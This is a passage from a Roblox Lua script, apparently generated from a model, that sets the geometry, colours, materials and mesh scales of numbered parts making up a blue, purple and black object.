Part339.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part339.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part339.Material = Enum.Material.Neon
Part339.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part339.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part339.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part339.brickColor = BrickColor.new("Bright blue")
SpecialMesh340.Parent = Part339
SpecialMesh340.Scale = Vector3.new(0.449999988, 1, 0.100000001)
SpecialMesh340.MeshType = Enum.MeshType.Brick
Part341.Parent = Model0
Part341.CFrame = CFrame.new(-0.610086679, 3.15827918, -15.1365986, -0.999985635, 0.00409500999, -0.00345871458, -0.00513683027, -0.916451037, 0.400114089, -0.00153127091, 0.40012604, 0.916459024)
Part341.Orientation = Vector3.new(-23.5900002, -0.219999999, -179.679993)
Part341.Position = Vector3.new(-0.610086679, 3.15827918, -15.1365986)
Part341.Rotation = Vector3.new(-23.5900002, -0.199999988, -179.769989)
Part341.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part341.Velocity = Vector3.new(7.15190893e-08, 0.0024645091, 9.39837378e-07)
Part341.Size = Vector3.new(0.275000006, 0.221124932, 0.655375004)
Part341.Anchored = true
Part341.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part341.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part341.BrickColor = BrickColor.new("Really black")
Part341.CanCollide = false
Part341.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part341.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part341.Material = Enum.Material.Metal
Part341.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part341.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part341.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part341.brickColor = BrickColor.new("Really black")
SpecialMesh342.Parent = Part341
SpecialMesh342.Scale = Vector3.new(0.400000006, 1.04999995, 0.899999976)
SpecialMesh342.MeshType = Enum.MeshType.Brick
Part343.Parent = Model0
Part343.CFrame = CFrame.new(-0.576193094, 2.37180829, -14.2261257, 0.00114334025, 0.999985635, -0.00523668947, -0.483495861, 0.00513671385, 0.8753317, 0.875346005, 0.00153111527, 0.483494759)
Part343.Orientation = Vector3.new(-61.079998, -0.620000005, -89.3899994)
Part343.Position = Vector3.new(-0.576193094, 2.37180829, -14.2261257)
Part343.Rotation = Vector3.new(-61.0900002, -0.299999982, -89.9300003)
Part343.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part343.Velocity = Vector3.new(1.96226381e-07, 0.00246641156, 2.57862462e-06)
Part343.Size = Vector3.new(0.405000031, 0.200000003, 0.280375004)
Part343.Anchored = true
Part343.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part343.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part343.BrickColor = BrickColor.new("Royal purple")
Part343.CanCollide = false
Part343.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part343.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part343.Material = Enum.Material.Neon
Part343.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part343.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part343.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part343.brickColor = BrickColor.new("Royal purple")
SpecialMesh344.Parent = Part343
SpecialMesh344.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh344.MeshType = Enum.MeshType.Wedge
Part345.Parent = Model0
Part345.CFrame = CFrame.new(-0.606692195, 3.59138489, -18.8080196, 0.999985635, 0.00250130473, 0.00474093435, 0.00513696205, -0.699832857, -0.714288294, 0.00153120875, 0.714302421, -0.699835718)
Part345.Orientation = Vector3.new(45.579998, 179.610001, 179.580002)
Part345.Position = Vector3.new(-0.606692195, 3.59138489, -18.8080196)
Part345.Rotation = Vector3.new(134.410004, 0.269999981, -0.140000001)
Part345.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part345.Velocity = Vector3.new(2.843354e-09, 0.00245685945, 3.73652256e-08)
Part345.Size = Vector3.new(0.275000006, 0.47012496, 0.214375019)
Part345.Anchored = true
Part345.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part345.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part345.BrickColor = BrickColor.new("Bright blue")
Part345.CanCollide = false
Part345.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part345.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part345.Material = Enum.Material.Neon
Part345.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part345.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part345.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part345.brickColor = BrickColor.new("Bright blue")
SpecialMesh346.Parent = Part345
SpecialMesh346.Scale = Vector3.new(0.449999988, 0.699999988, 0.100000001)
SpecialMesh346.MeshType = Enum.MeshType.Brick
Part347.Parent = Model0
Part347.CFrame = CFrame.new(-0.612170458, 3.17509294, -13.8325748, -0.999985635, 0.00162795268, 0.00510695158, -0.00513688475, -0.0189460143, -0.999807417, -0.00153088232, -0.999819279, 0.0189541057)
Part347.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part347.Position = Vector3.new(-0.612170458, 3.17509294, -13.8325748)
Part347.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part347.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part347.Velocity = Vector3.new(6.88530264e-08, 0.002467226, 9.04802221e-07)
Part347.Size = Vector3.new(0.275000006, 0.207000002, 0.303375006)
Part347.Anchored = true
Part347.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part347.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part347.BrickColor = BrickColor.new("Really black")
Part347.CanCollide = false
Part347.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part347.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part347.Material = Enum.Material.Metal
Part347.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part347.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part347.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part347.brickColor = BrickColor.new("Really black")
SpecialMesh348.Parent = Part347
SpecialMesh348.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh348.MeshType = Enum.MeshType.Wedge
Part349.Parent = Model0
Part349.CFrame = CFrame.new(-0.608221889, 3.47114682, -17.4040871, 0.999985635, -0.00133592309, 0.00519115338, 0.00513700396, -0.037765637, -0.999273479, 0.00153099932, 0.999285877, -0.0377582312)
Part349.Orientation = Vector3.new(87.8199997, 172.169998, 172.25)
Part349.Position = Vector3.new(-0.608221889, 3.47114682, -17.4040871)
Part349.Rotation = Vector3.new(92.159996, 0.299999982, 0.0799999982)
Part349.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part349.Velocity = Vector3.new(2.19089991e-08, 0.0024597845, 2.87908023e-07)
Part349.Size = Vector3.new(0.275000006, 0.678124905, 0.214375019)
Part349.Anchored = true
Part349.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part349.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part349.BrickColor = BrickColor.new("Bright blue")
Part349.CanCollide = false
Part349.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part349.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part349.Material = Enum.Material.Neon
Part349.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part349.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part349.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part349.brickColor = BrickColor.new("Bright blue")
SpecialMesh350.Parent = Part349
SpecialMesh350.Scale = Vector3.new(0.449999988, 0.800000012, 0.100000001)
SpecialMesh350.MeshType = Enum.MeshType.Brick
Part351.Parent = Model0
Part351.CFrame = CFrame.new(-0.617746711, 3.42490911, -11.0273066, 0.999985635, -0.000716609415, 0.00531159993, 0.00513640279, -0.15495652, -0.987908006, 0.00153101061, 0.987921119, -0.154950604)
Part351.Orientation = Vector3.new(81.0800018, 178.039993, 178.099991)
Part351.Position = Vector3.new(-0.617746711, 3.42490911, -11.0273066)
Part351.Rotation = Vector3.new(98.909996, 0.299999982, 0.0399999991)
Part351.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part351.Velocity = Vector3.new(2.92407876e-08, 0.00247307052, 3.84254577e-07)
Part351.Size = Vector3.new(0.275000006, 0.203125, 0.234375)
Part351.Anchored = true
Part351.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part351.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part351.BrickColor = BrickColor.new("Really black")
Part351.CanCollide = false
Part351.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part351.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part351.Material = Enum.Material.Metal
Part351.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part351.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part351.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part351.brickColor = BrickColor.new("Really black")
SpecialMesh352.Parent = Part351
SpecialMesh352.Scale = Vector3.new(0.5, 0.502499998, 0.400000006)
SpecialMesh352.MeshType = Enum.MeshType.Brick
Part353.Parent = Model0
Part353.CFrame = CFrame.new(-0.638692379, 2.37148738, -14.226222, -0.00114342954, -0.999985635, -0.00523668341, 0.483495861, -0.00513675157, 0.8753317, -0.875346065, -0.00153103401, 0.483494759)
Part353.Orientation = Vector3.new(-61.079998, -0.620000005, 90.6100006)
Part353.Position = Vector3.new(-0.638692379, 2.37148738, -14.226222)
Part353.Rotation = Vector3.new(-61.0900002, -0.299999982, 90.0699997)
Part353.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part353.Velocity = Vector3.new(1.9627727e-07, 0.00246640155, 2.57929332e-06)
Part353.Size = Vector3.new(0.405000031, 0.200000003, 0.280375004)
Part353.Anchored = true
Part353.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part353.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part353.BrickColor = BrickColor.new("Royal purple")
Part353.CanCollide = false
Part353.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part353.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part353.Material = Enum.Material.Neon
Part353.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part353.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part353.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part353.brickColor = BrickColor.new("Royal purple")
SpecialMesh354.Parent = Part353
SpecialMesh354.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh354.MeshType = Enum.MeshType.Wedge
Part355.Parent = Model0
Part355.CFrame = CFrame.new(-0.576556623, 2.33930445, -13.8796148, -0.00289415126, 0.999985635, -0.00451143365, 0.277069539, 0.00513670407, 0.960836232, 0.96084559, 0.00153082411, -0.277080417)
Part355.Orientation = Vector3.new(-73.909996, -179.069992, 88.9399948)
Part355.Position = Vector3.new(-0.576556623, 2.33930445, -13.8796148)
Part355.Rotation = Vector3.new(-106.089996, -0.25999999, -90.1699982)
Part355.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part355.Velocity = Vector3.new(2.01380388e-07, 0.00246713357, 2.64635355e-06)
Part355.Size = Vector3.new(0.453000009, 0.200000003, 0.280375004)
Part355.Anchored = true
Part355.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part355.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part355.BrickColor = BrickColor.new("Royal purple")
Part355.CanCollide = false
Part355.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part355.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part355.Material = Enum.Material.Neon
Part355.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part355.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part355.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part355.brickColor = BrickColor.new("Royal purple")
SpecialMesh356.Parent = Part355
SpecialMesh356.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh356.MeshType = Enum.MeshType.Wedge
Part357.Parent = Model0
Part357.CFrame = CFrame.new(-0.609105706, 2.8586967, -14.7735023, -0.999985635, -0.0039632949, -0.00360830128, -0.00513646565, 0.516311884, 0.856385469, -0.00153109885, 0.856391609, -0.516324818)
Part357.Orientation = Vector3.new(-58.9099998, -179.599991, -0.569999993)
Part357.Position = Vector3.new(-0.609105706, 2.8586967, -14.7735023)
Part357.Rotation = Vector3.new(-121.089996, -0.209999993, 179.769989)
Part357.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part357.Velocity = Vector3.new(1.19022602e-07, 0.0024652658, 1.56408419e-06)
Part357.Size = Vector3.new(0.275000006, 0.277124912, 0.227375031)
Part357.Anchored = true
Part357.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part357.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part357.BrickColor = BrickColor.new("Really black")
Part357.CanCollide = false
Part357.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part357.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part357.Material = Enum.Material.Metal
Part357.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part357.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part357.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part357.brickColor = BrickColor.new("Really black")
SpecialMesh358.Parent = Part357
SpecialMesh358.Scale = Vector3.new(0.349999994, 0.300000012, 1)
SpecialMesh358.MeshType = Enum.MeshType.Brick
Part359.Parent = Model0
Part359.CFrame = CFrame.new(-0.614465594, 3.24354935, -12.5620441, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part359.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part359.Position = Vector3.new(-0.614465594, 3.24354935, -12.5620441)
Part359.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part359.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part359.Velocity = Vector3.new(5.79982e-08, 0.00246987306, 7.62158038e-07)
Part359.Size = Vector3.new(0.275000006, 0.998124957, 0.280375004)
Part359.Anchored = true
Part359.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part359.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part359.BrickColor = BrickColor.new("Really black")
Part359.CanCollide = false
Part359.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part359.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part359.Material = Enum.Material.Metal
Part359.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part359.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part359.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part359.brickColor = BrickColor.new("Really black")
SpecialMesh360.Parent = Part359
SpecialMesh360.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh360.MeshType = Enum.MeshType.Brick
Part361.Parent = Model0
Part361.CFrame = CFrame.new(-0.611248136, 3.25645614, -14.7074032, -0.999985635, 0.00245982548, -0.00476256292, -0.00513693923, -0.693573654, 0.720367551, -0.00153120921, 0.720381677, 0.693576276)
Part361.Orientation = Vector3.new(-46.079998, -0.389999986, -179.580002)
Part361.Position = Vector3.new(-0.611248136, 3.25645614, -14.7074032)
Part361.Rotation = Vector3.new(-46.0900002, -0.269999981, -179.860001)
Part361.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part361.Velocity = Vector3.new(5.59516025e-08, 0.00246540317, 7.35263882e-07)
Part361.Size = Vector3.new(0.275000006, 0.221124932, 0.418375015)
Part361.Anchored = true
Part361.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part361.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part361.BrickColor = BrickColor.new("Really black")
Part361.CanCollide = false
Part361.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part361.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part361.Material = Enum.Material.Metal
Part361.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part361.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part361.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part361.brickColor = BrickColor.new("Really black")
SpecialMesh362.Parent = Part361
SpecialMesh362.Scale = Vector3.new(0.550000012, 1.04999995, 0.899999976)
SpecialMesh362.MeshType = Enum.MeshType.Brick
Part363.Parent = Model0
Part363.CFrame = CFrame.new(-0.611290276, 3.1978817, -14.4833202, 0.999985635, 0.00162786234, -0.00510698371, 0.00513691502, -0.0189458374, 0.999807417, 0.00153079221, -0.999819279, -0.0189539269)
Part363.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part363.Position = Vector3.new(-0.611290276, 3.1978817, -14.4833202)
Part363.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part363.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part363.Velocity = Vector3.new(6.52394974e-08, 0.00246587023, 8.57316763e-07)
Part363.Size = Vector3.new(0.275000006, 0.221124932, 0.448374987)
Part363.Anchored = true
Part363.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part363.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part363.BrickColor = BrickColor.new("Really black")
Part363.CanCollide = false
Part363.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part363.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part363.Material = Enum.Material.Metal
Part363.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part363.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part363.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part363.brickColor = BrickColor.new("Really black")
SpecialMesh364.Parent = Part363
SpecialMesh364.Scale = Vector3.new(0.550000012, 1.04999995, 0.800000012)
SpecialMesh364.MeshType = Enum.MeshType.Brick
Part365.Parent = Model0
Part365.CFrame = CFrame.new(-0.610800147, 2.91253304, -13.8467321, -0.999985635, -0.00162807154, -0.00510650687, -0.00513644237, 0.0189459547, 0.999807417, -0.00153100991, 0.999819279, -0.0189540461)
Part365.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part365.Position = Vector3.new(-0.610800147, 2.91253304, -13.8467321)
Part365.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part365.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part365.Velocity = Vector3.new(1.10486013e-07, 0.00246719667, 1.45190415e-06)
Part365.Size = Vector3.new(0.275000006, 0.200000003, 0.213375002)
Part365.Anchored = true
Part365.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part365.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part365.BrickColor = BrickColor.new("Bright blue")
Part365.CanCollide = false
Part365.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part365.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part365.Material = Enum.Material.Neon
Part365.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part365.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part365.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part365.brickColor = BrickColor.new("Bright blue")
SpecialMesh366.Parent = Part365
SpecialMesh366.Scale = Vector3.new(0.550000012, 0.25, 0.5)
SpecialMesh366.MeshType = Enum.MeshType.Wedge
Part367.Parent = Model0
Part367.CFrame = CFrame.new(-0.616349459, 3.1451273, -11.0012493, -0.999985635, -0.000250895391, -0.00535403285, -0.00513659744, -0.24046874, 0.970643461, -0.001531007, 0.970656931, 0.240463987)
Part367.Orientation = Vector3.new(-76.0800018, -1.27999997, -178.779999)
Part367.Position = Vector3.new(-0.616349459, 3.1451273, -11.0012493)
Part367.Rotation = Vector3.new(-76.0899963, -0.310000002, 179.98999)
Part367.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part367.Velocity = Vector3.new(7.3604582e-08, 0.002473125, 9.67242272e-07)
Part367.Size = Vector3.new(0.200000003, 0.449500024, 0.236624971)
Part367.Anchored = true
Part367.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part367.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part367.BrickColor = BrickColor.new("Bright blue")
Part367.CanCollide = false
Part367.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part367.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part367.Material = Enum.Material.Neon
Part367.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part367.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part367.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part367.brickColor = BrickColor.new("Bright blue")
SpecialMesh368.Parent = Part367
SpecialMesh368.Scale = Vector3.new(0.5, 1, 0.25)
SpecialMesh368.MeshType = Enum.MeshType.Brick
Part369.Parent = Model0
Part369.CFrame = CFrame.new(-0.612978816, 3.18449855, -13.3361721, 0.999985635, -0.00162807154, 0.00510664983, 0.00513658533, 0.0189459547, -0.999807417, 0.00153100723, 0.999819279, 0.0189540461)
Part369.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part369.Position = Vector3.new(-0.612978816, 3.18449855, -13.3361721)
Part369.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part369.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part369.Velocity = Vector3.new(6.73616256e-08, 0.00246826024, 8.85203519e-07)
Part369.Size = Vector3.new(0.275000006, 0.200000003, 0.303375006)
Part369.Anchored = true
Part369.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part369.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part369.BrickColor = BrickColor.new("Really black")
Part369.CanCollide = false
Part369.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part369.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part369.Material = Enum.Material.Metal
Part369.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part369.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part369.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part369.brickColor = BrickColor.new("Really black")
SpecialMesh370.Parent = Part369
SpecialMesh370.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh370.MeshType = Enum.MeshType.Wedge
Part371.Parent = Model0
Part371.CFrame = CFrame.new(-0.611412168, 3.19930172, -14.4084625, 0.999985635, 0.00162786234, -0.00510698371, 0.00513691502, -0.0189458374, 0.999807417, 0.00153079221, -0.999819279, -0.0189539269)
Part371.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part371.Position = Vector3.new(-0.611412168, 3.19930172, -14.4084625)
Part371.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part371.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part371.Velocity = Vector3.new(6.50143335e-08, 0.00246602623, 8.54357836e-07)
Part371.Size = Vector3.new(0.275000006, 0.204124942, 0.464375019)
Part371.Anchored = true
Part371.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part371.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part371.BrickColor = BrickColor.new("Royal purple")
Part371.CanCollide = false
Part371.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part371.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part371.Material = Enum.Material.Neon
Part371.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part371.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part371.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part371.brickColor = BrickColor.new("Royal purple")
SpecialMesh372.Parent = Part371
SpecialMesh372.Scale = Vector3.new(0.524999976, 1.04999995, 0.800000012)
SpecialMesh372.MeshType = Enum.MeshType.Brick
Part373.Parent = Model0
Part373.CFrame = CFrame.new(-0.607544899, 3.43064713, -17.7122707, 0.999985635, -0.004783432, 0.00241859211, 0.00513692852, 0.726393282, -0.68726027, 0.00153061328, 0.687262774, 0.726407468)
Part373.Orientation = Vector3.new(43.4099998, 0.189999998, 0.409999996)
Part373.Position = Vector3.new(-0.607544899, 3.43064713, -17.7122707)
Part373.Rotation = Vector3.new(43.4099998, 0.140000001, 0.269999981)
Part373.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part373.Velocity = Vector3.new(2.83308559e-08, 0.00245914259, 3.72298132e-07)
Part373.Size = Vector3.new(0.275000006, 0.24712491, 0.214375019)
Part373.Anchored = true
Part373.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part373.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part373.BrickColor = BrickColor.new("Bright blue")
Part373.CanCollide = false
Part373.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part373.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part373.Material = Enum.Material.Neon
Part373.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part373.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part373.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part373.brickColor = BrickColor.new("Bright blue")
SpecialMesh374.Parent = Part373
SpecialMesh374.Scale = Vector3.new(0.449999988, 0.600000024, 0.100000001)
SpecialMesh374.MeshType = Enum.MeshType.Brick
Part375.Parent = Model0
Part375.CFrame = CFrame.new(-0.613238811, 3.32843637, -13.6493177, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part375.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part375.Position = Vector3.new(-0.613238811, 3.32843637, -13.6493177)
Part375.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part375.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part375.Velocity = Vector3.new(4.45380195e-08, 0.00246760761, 5.85277007e-07)
Part375.Size = Vector3.new(0.275000006, 0.698124886, 0.534374952)
Part375.Anchored = true
Part375.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part375.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part375.BrickColor = BrickColor.new("Bright blue")
Part375.CanCollide = false
Part375.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part375.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part375.Material = Enum.Material.Glass
Part375.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part375.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part375.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part375.brickColor = BrickColor.new("Bright blue")
SpecialMesh376.Parent = Part375
SpecialMesh376.Scale = Vector3.new(0.452499986, 1, 1)
SpecialMesh376.MeshType = Enum.MeshType.Cylinder
Part377.Parent = Model0
Part377.CFrame = CFrame.new(-0.618502736, 3.35398197, -11.388195, -0.999985635, 0.00162807188, 0.00510671316, -0.00513664866, -0.0189460143, -0.999807417, -0.00153100595, -0.999819279, 0.0189541057)
Part377.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part377.Position = Vector3.new(-0.618502736, 3.35398197, -11.388195)
Part377.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part377.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part377.Velocity = Vector3.new(4.0487393e-08, 0.00247231848, 5.32047068e-07)
Part377.Size = Vector3.new(0.25999999, 0.225500003, 0.210125014)
Part377.Anchored = true
Part377.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part377.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part377.BrickColor = BrickColor.new("Really black")
Part377.CanCollide = false
Part377.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part377.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part377.Material = Enum.Material.Metal
Part377.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part377.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part377.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part377.brickColor = BrickColor.new("Really black")
SpecialMesh378.Parent = Part377
SpecialMesh378.Scale = Vector3.new(0.5, 1, 1)
SpecialMesh378.MeshType = Enum.MeshType.Wedge
Part379.Parent = Model0
Part379.CFrame = CFrame.new(-0.575232625, 3.71340823, -19.3540096, 0.00507748965, 0.999985635, -0.00171704218, -0.999324501, 0.00513662118, 0.0363931209, 0.0364014208, 0.00153109594, 0.999336243)
Part379.Orientation = Vector3.new(-2.08999991, -0.099999994, -89.7099991)
Part379.Position = Vector3.new(-0.575232625, 3.71340823, -19.3540096)
Part379.Rotation = Vector3.new(-2.08999991, -0.099999994, -89.7099991)
Part379.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part379.Velocity = Vector3.new(-1.65053677e-08, 0.00245572673, -2.16897547e-07)
Part379.Size = Vector3.new(0.210000038, 0.200000003, 0.285374999)
Part379.Anchored = true
Part379.BackSurface = Enum.SurfaceType.SmoothNoOutlines
